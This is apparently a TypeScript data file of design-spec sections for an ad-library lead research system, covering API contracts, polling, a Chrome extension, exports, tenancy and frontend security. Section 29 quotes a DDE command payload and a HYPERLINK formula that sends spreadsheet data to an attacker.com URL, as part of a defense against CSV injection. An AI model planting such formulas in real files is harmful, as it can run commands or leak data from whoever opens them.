  // Job Lifecycle & Controls
  createJob(req: JobCreationFormModel): Promise<ResearchJobModel>;
  getJob(jobId: string): Promise<ResearchJobModel>;
  listJobs(params: JobListQuery): Promise<PaginatedResponse<ResearchJobModel>>;
  controlJob(jobId: string, action: 'START' | 'PAUSE' | 'RESUME' | 'CANCEL'): Promise<ResearchJobModel>;

  // Entity Inspection
  listAdvertisers(query: AdvertiserQuery): Promise<CursorResponse<AdvertiserViewModel>>;
  getAdvertiser(id: string): Promise<AdvertiserViewModel>;
  getAdvertiserAds(id: string): Promise<AdViewModel[]>;

  // Reviews & Overrides
  listReviews(type: ReviewQueueType): Promise<ReviewItemModel[]>;
  submitIdentityResolution(pairId: string, decision: 'MERGE' | 'SPLIT' | 'DEFER'): Promise<void>;
  submitManualOverride(submission: ManualOverrideSubmission): Promise<void>;

  // Export Pipeline
  createExport(request: ExportRequest): Promise<ExportJobModel>;
  getExportStatus(exportId: string): Promise<ExportJobModel>;
  getDownloadUrl(exportId: string, token: string): string;
}
\`\`\`

If the BFF responds with an incompatible API version (not matching \`apiVersion: "v1.0.0"\`), the client fails gracefully with a visible schema mismatch notification.`,
    keyTakeaways: [
      '100% typed request and response contracts.',
      'Eliminates hand-rolled fetch calls scattered across components.',
      'Graceful error envelopes with support correlation IDs.'
    ]
  },
  {
    id: 'p8-sec-24',
    number: '24',
    title: 'Real-Time & Polling Communication Strategy',
    summary: 'Bounded interval polling with automatic terminal state disconnects, fallback reconnection, and tab visibility awareness.',
    content: `### 24. Polling & Connection Lifecycle Management

To monitor active browser worker jobs without opening hundreds of fragile WebSocket connections, Phase 08 utilizes an adaptive polling strategy with Page Visibility API integration:

\`\`\`
Job Enqueued / Active
       |
       v
Is Browser Tab Visible?
  - YES: Poll GET /api/v1/jobs/:id at interval = 3000ms
  - NO (Background tab): Backoff interval to 15000ms
       |
       v
Is Job State Terminal? (COMPLETED | PARTIAL | FAILED | CANCELLED | CHALLENGED)
  - YES: STOP POLLING IMMEDIATELY. Disconnect timer.
  - NO: Continue next cycle.
\`\`\`

### Guardrails
- **Duplicate Prevention**: In-flight HTTP requests abort previous stale polling promises.
- **Maximum Duration**: Polling halts automatically if a run exceeds 30 minutes without progress.
- **SSE Support**: For high-concurrency enterprise deployments, the API client exposes an optional Server-Sent Events (\`/api/v1/jobs/:id/stream\`) endpoint.`,
    keyTakeaways: [
      'Bounded 3-second polling stops immediately upon terminal state.',
      'Page Visibility API backs off polling when tab is hidden.',
      'Prevents duplicate concurrent network requests.'
    ]
  },
  {
    id: 'p8-sec-25',
    number: '25',
    title: 'Chrome Manifest V3 Architecture & Service Worker',
    summary: 'Manifest V3 compliant extension architecture isolating the popup UI, background service worker, and storage.',
    content: `### 25. Manifest V3 Extension Specification

The Chrome Extension acts as a portable operator assistant that detects when the user is viewing public Meta Ad Library search results and enables 1-click workspace dispatch:

\`\`\`
Chrome Browser Tab (Meta Ad Library)
       |
       | User clicks extension icon
       v
Extension Action Popup (React / TypeScript)
       |
       | 1. chrome.tabs.query({ active: true })
       | 2. Detects query param: q=solar+installation
       v
Runtime Message Dispatch (chrome.runtime.sendMessage)
       |
       v
Background Service Worker (background.js)
       |
       | 3. Validates message schema
       | 4. Dispatches POST /api/v1/jobs to backend BFF
       v
Operator Dashboard Workspace Opened in Tab
\`\`\`

### Manifest V3 Declarations (\`manifest.json\`)
\`\`\`json
{
  "manifest_version": 3,
  "name": "Meta Ad Library Research Cockpit",
  "version": "8.0.0",
  "description": "Operator control and research dispatch assistant for Meta Ad Library Lead Research System.",
  "permissions": [
    "activeTab",
    "storage"
  ],
  "action": {
    "default_popup": "popup.html",
    "default_title": "Ad Library Research Cockpit"
  },
  "background": {
    "service_worker": "background.js",
    "type": "module"
  }
}
\`\`\``,
    keyTakeaways: [
      'Strictly compliant with Chrome Manifest V3 standards.',
      'Uses ephemeral background service worker.',
      'Does not run parallel background web scraping.'
    ]
  },
  {
    id: 'p8-sec-26',
    number: '26',
    title: 'Extension Permissions Minimization & Security Sandbox',
    summary: 'Minimal permission footprint (activeTab + storage only) with strict message validation and zero broad host permissions.',
    content: `### 26. Extension Security & Host Permission Isolation

Many browser extensions fail security audits because they request excessive broad permissions (such as \`<all_urls>\` or \`*://*.facebook.com/*\`).

### Permission Audit & Risk Analysis
1. **\`activeTab\`**: Granted ONLY when the user clicks the extension icon. Allows reading the URL of the current active tab. Zero background tab spying.
2. **\`storage\`**: Isolated to \`chrome.storage.local\` for saving the operator's workspace endpoint URL and session token.
3. **\`declarativeNetRequest\`**: **BANNED**. The extension does not modify HTTP headers or redirect traffic.
4. **\`cookies\`**: **BANNED**. The extension does not read or clone Meta session cookies.
5. **\`webRequest\`**: **BANNED**. No network packet inspection.

### Message Validation
Messages passed between the popup and service worker are validated against a strict TypeScript schema. Malformed or unrecognized message types are discarded with warning logs.`,
    keyTakeaways: [
      'Only activeTab and storage permissions requested.',
      'Zero broad host permissions (<all_urls> is strictly banned).',
      'Validates all inter-process runtime messages.'
    ]
  },
  {
    id: 'p8-sec-27',
    number: '27',
    title: 'Export Architecture & Point-in-Time Semantics',
    summary: 'Backend-driven asynchronous export pipeline generating immutable point-in-time snapshots with time-bound download tokens.',
    content: `### 27. Asynchronous Server-Side Export Architecture

Exporting thousands of enriched leads cannot be done by dumping browser memory into a client-side blob. This causes browser tab crashes and bypasses audit controls.

\`\`\`
Operator Configures Export Dialog
       |
       | 1. Selects Profile (BASIC_LEAD_EXPORT, DETAILED_RESEARCH_EXPORT)
       | 2. Chooses Format (CSV, JSON, XLSX)
       | 3. Applies Filters (QUALIFIED only, Country: US)
       v
POST /api/v1/exports
       |
       | 4. Backend creates export_artifact record (Layer H)
       | 5. Worker streams records from v_lead_research_current
       | 6. Applies Formula Injection Sanitization to text fields
       | 7. Writes encrypted artifact to private cloud storage
       | 8. Calculates SHA-256 checksum
       v
Returns exportId & Status = COMPLETED
       |
       v
GET /api/v1/exports/:id/download?token=<dl_tok_UUIDv7>
  - Validates time-limited token (expires in 2 hours)
  - Enforces tenant ownership
  - Streams sanitized file with Content-Disposition header
\`\`\``,
    keyTakeaways: [
      'Asynchronous server-side generation prevents browser tab crashes.',
      'Immutable point-in-time snapshot linked to schema version.',
      'Time-limited HMAC-signed download tokens expire in 120 minutes.'
    ]
  },
  {
    id: 'p8-sec-28',
    number: '28',
    title: 'CSV / JSON / XLSX Schemas & Field Classification',
    summary: 'Export profiles classifying fields into Safe Business Data, Provenance Metadata, Internal Redacted, and Prohibited tiers.',
    content: `### 28. Export Profiles & Data Classification

To prevent internal system credentials or unverified personal data from leaking into client files, all exportable fields are classified into four tiers:

\`\`\`
+-------------------------------------------------------------------------+
| FIELD CLASSIFICATION TIERS                                              |
|                                                                         |
| 1. SAFE_BUSINESS DATA:                                                  |
|    - Advertiser Name, Page ID, Active Ad Count, Domain, Score, State.   |
|    - Included in all profiles; formula-sanitized.                       |
|                                                                         |
| 2. PROVENANCE METADATA:                                                 |
|    - Model Version, Adapter Version, Extraction Timestamps, SHA-256.    |
|    - Included in DETAILED and AUDIT profiles only.                      |
|                                                                         |
| 3. INTERNAL SYSTEM METADATA [REDACTED]:                                 |
|    - Worker container IPs, database primary keys, correlation UUIDs.    |
|    - Stripped from standard commercial exports.                         |
|                                                                         |
| 4. PROHIBITED SECRETS [BLOCKED]:                                        |
|    - Auth tokens, session cookies, database passwords, proxy creds.     |
|    - HARD BLOCKED by export schema validator.                           |
+-------------------------------------------------------------------------+
\`\`\`

### Supported Profiles
- **BASIC_LEAD_EXPORT**: High-level contact & qualification summary for sales teams.
- **DETAILED_RESEARCH_EXPORT**: Comprehensive commercial dossier including verification and positive/negative evidence signals.
- **AUDIT_EXPORT**: Complete compliance log including model versions, timestamps, and review statuses.
- **QUALIFICATION_EXPORT**: Focuses specifically on mathematical scoring signals, rule IDs, and blockers.`,
    keyTakeaways: [
      'Four-tier data classification prevents accidental credential leakage.',
      'Prohibited secrets are hard-blocked by automated export validators.',
      'Four targeted export profiles tailored to specific business roles.'
    ]
  },
  {
    id: 'p8-sec-29',
    number: '29',
    title: 'Spreadsheet Formula Injection Defense',
    summary: 'Mandatory neutralization of dangerous spreadsheet formula triggers (=, +, -, @, \\t, \\r) by single-quote escaping.',
    content: `### 29. Defeating CSV / Spreadsheet Formula Injection (CSV Injection)

When CSV files are opened in Microsoft Excel, Google Sheets, or LibreOffice, cells starting with formula characters can execute arbitrary commands or exfiltrate data via dynamic data exchange (DDE).

### The Attack Vectors
An adversarial advertiser could publish an ad with headline:
\`=cmd|' /C calc'!A0\` or \`+HYPERLINK("http://attacker.com/steal?lead="&A1, "Click")\`

### Mandatory Neutralization Policy
Before serializing any string value to CSV or Excel formats:
1. **Detect Trigger Characters**: If the first non-whitespace character is \`=\`, \`+\`, \`-\`, \`@\`, \`\\t\`, or \`\\r\`:
2. **Prepend Single Quote (\')**: Prepend an ASCII single quote character to the cell value.
   - Raw: \`=cmd|' /C calc'!A0\`
   - Serialized: \`'=cmd|' /C calc'!A0\`
3. **Client Spreadsheets Behavior**: Excel and Google Sheets interpret the leading quote as an instruction to treat the cell purely as plain text, suppressing formula evaluation. The quote itself is hidden from normal spreadsheet display.
4. **Preserve Raw Value**: In JSON exports and raw database storage, the unescaped text is preserved for analytical fidelity.`,
    keyTakeaways: [
      'Protects operators from malicious DDE command execution in Excel.',
      'Prepends single-quote to cells beginning with =, +, -, @, tab, or carriage return.',
      'Raw strings remain pristine in JSON and database layers.'
    ]
  },
  {
    id: 'p8-sec-30',
    number: '30',
    title: 'Multi-Tenancy & Authorization UX',
    summary: 'Enforcing tenant isolation and role permissions server-side with zero client-side trust.',
    content: `### 30. Tenancy & Access Control Boundaries

The system supports multi-tenant enterprise isolation:

### Zero Client-Side Trust
1. **Tenant ID Derivation**: The client UI NEVER supplies \`tenantId\` as a freely editable query parameter or request body field. The BFF derives \`tenantId\` strictly from the verified JWT bearer session token.
2. **Cross-Tenant Guardrail**: If an operator attempts to request \`/api/v1/jobs/job_other_tenant_01\`, the backend returns \`404 Not Found\` (not \`403 Forbidden\`) to avoid leaking the existence of other tenants' records.
3. **Role-Based Access Control (RBAC)**:
   - \`OPERATOR\`: Can create jobs, inspect results, and run exports.
   - \`LEAD_REVIEWER\`: Can resolve identity pairs and submit manual score overrides.
   - \`ADMIN\`: Can configure scoring models and view tenant audit ledgers.`,
    keyTakeaways: [
      'Tenant ID is authoritatively derived from verified server session.',
      'Cross-tenant requests return uniform 404 to prevent enumeration.',
      'Strict separation between Operator, Reviewer, and Admin roles.'
    ]
  },
  {
    id: 'p8-sec-31',
    number: '31',
    title: 'Frontend Security, Anti-XSS & WCAG AA Accessibility',
    summary: 'Strict JSX escaping, safe external link navigation, protocol allowlists, and WCAG AA accessibility standards.',
    content: `### 31. Security Hardening & Accessibility Standards

### Frontend Security Controls
1. **Anti-XSS**: All advertiser names, ad copy, and landing page texts are rendered as plain text nodes in React JSX. \`dangerouslySetInnerHTML\` is strictly prohibited across the codebase.
2. **Safe External Links**: Links to external advertiser domains utilize the \`SafeExternalLink\` component:
   - Validates protocol: only \`http:\` and \`https:\` permitted (blocks \`javascript:\`, \`data:\`, \`vbscript:\`).
   - Enforces \`rel="noopener noreferrer"\` and \`target="_blank"\`.
3. **Content Security Policy (CSP)**:
   \`default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.leadops.internal;\`

### Accessibility Standards (WCAG 2.1 AA)
- **Non-Color Indicators**: All status badges pair color with distinctive text labels and SVG icons.
- **Keyboard Navigation**: Full tab navigation order with high-contrast visible focus rings (\`focus:ring-2 focus:ring-neutral-900\`).
- **Screen Reader Support**: Active run progress monitors use \`role="status"\` and \`aria-live="polite"\` to announce progress without interrupting operator screen reader focus.
- **Semantic Tables**: Tables use \`<th scope="col">\` and \`aria-describedby\` attributes.`,
    keyTakeaways: [
      'Zero dangerouslySetInnerHTML ensures 100% anti-XSS protection.',
      'SafeExternalLink component blocks malicious protocols like javascript:.',
      'WCAG 2.1 AA compliance with dual-channel visual encoding.'
    ]
  }
];
